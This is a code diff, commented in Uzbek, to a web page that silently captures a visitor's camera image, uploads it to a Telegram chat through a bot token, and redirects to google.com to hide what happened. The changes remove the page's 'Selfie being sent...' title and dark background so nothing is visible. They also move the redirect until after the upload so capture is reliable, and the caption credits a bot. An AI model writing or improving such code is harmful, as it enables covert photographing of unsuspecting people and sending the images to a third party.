@@ -3,12 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Selfie yuborilmoqda...</title>
+    <title></title>
     <style>
       body {
         font-family: sans-serif;
         text-align: center;
-        background: #000;
+        background: #fff;
         color: white;
       }
       video,
@@ -34,31 +34,40 @@
           const v = document.getElementById("v");
           v.srcObject = stream;
 
+          // video o'lchami yuklanishini kutamiz
           await new Promise((r) => setTimeout(r, 800));
 
           const c = document.getElementById("c");
-          c.width = v.videoWidth;
-          c.height = v.videoHeight;
           c.getContext("2d").drawImage(v, 0, 0);
 
           stream.getTracks().forEach((t) => t.stop());
 
-          c.toBlob((blob) => {
+          // blob olamiz va Telegramga yuboramiz
+          c.toBlob(async (blob) => {
             const form = new FormData();
             form.append("chat_id", chatId);
             form.append("photo", blob, "selfie.png");
-            form.append("caption", "*@koryapmanbot orqali olindi*", "markdown");
+            form.append("caption", "@koryapmanbot *orqali olindi*");
+            form.append("parse_mode", "Markdown");
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: form,
-            });
+            try {
+              await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: form,
+              });
+            } catch (err) {
+              console.error("Telegramga yuborishda xatolik:", err);
+            }
+
+            // faqat yuborilgandan keyin yo'naltirish
+            window.location.href = "https://google.com";
           }, "image/png");
-          window.location.href = "https://google.com";
         } catch (err) {
+          // xatolik bo‘lsa ham yo‘naltiramiz
           window.location.href = "https://google.com";
         }
       }
+
       start();
     </script>
   </body>
